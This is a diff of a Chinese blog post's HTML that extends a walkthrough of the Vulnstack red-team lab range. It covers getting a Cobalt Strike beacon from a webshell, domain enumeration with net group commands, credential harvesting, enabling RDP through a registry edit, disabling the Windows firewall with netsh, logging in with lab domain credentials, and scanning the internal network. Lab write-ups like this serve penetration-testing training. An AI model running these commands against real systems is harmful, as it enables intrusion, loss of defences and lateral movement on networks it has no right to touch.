@@ -535,7 +535,43 @@ set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#3
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113553829.png"></p>
 <p>使用蚁剑连接一句话木马<code>http://192.168.1.3/hack.php</code></p>
 <p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p>
-<h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3>
+<h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.5主机上，创建监听并生成powershell</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316115646878.png"></p>
+<p>时间反应比较慢，建议多执行几次并等一会</p>
+<p>提权成功</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120020075.png"></p>
+<h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120328097.png"></p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120358179.png"></p>
+<p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>
+net group “domain computers” /domain <span class="token comment">#查看域成员计算机列表</span>
+net group “domain admins” /domain <span class="token comment">#查看域管理员用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100603667-966546984.png"></p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100608263-1817479356.png"></p>
+<p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121241458.png"></p>
+<h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注册表开启3389端口
+REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+关闭防火墙
+netsh firewall <span class="token builtin class-name">set</span> opmode disable   			<span class="token comment">#winsows server 2003 之前</span>
+netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off 	<span class="token comment">#winsows server 2003 之后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p>
+<p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p>
+<h2 id="0x04-内网信息收集"><a href="#0x04-内网信息收集" class="headerlink" title="0x04 内网信息收集"></a>0x04 内网信息收集</h2><h3 id="4-1-域信息收集"><a href="#4-1-域信息收集" class="headerlink" title="4.1 域信息收集"></a>4.1 域信息收集</h3><p>前面收集到的信息Win7计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p>
+<p>win7内网的IP地址为192.168.52.143</p>
+<p>进一步开始收集，这里使用k8gege开发的cobalt strick ladon插件直接进行域内存活主机探测</p>
+<p><img src="/2022/03/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316123002914.png"></p>
+<p>域成员：192.168.52.141</p>
+<p>域控DC：192.168.52.138</p>
+<h3 id="4-5-内网漏洞扫描"><a href="#4-5-内网漏洞扫描" class="headerlink" title="4.5 内网漏洞扫描"></a>4.5 内网漏洞扫描</h3><p>前期我们获取到win7的远程桌面也可以通过远程发现win7主机上安装了nmap工具，我们可以进一步针对192.168.52.0&#x2F;24内网网段进行漏洞信息收集</p>
+
                 
             </div>
             <hr/>
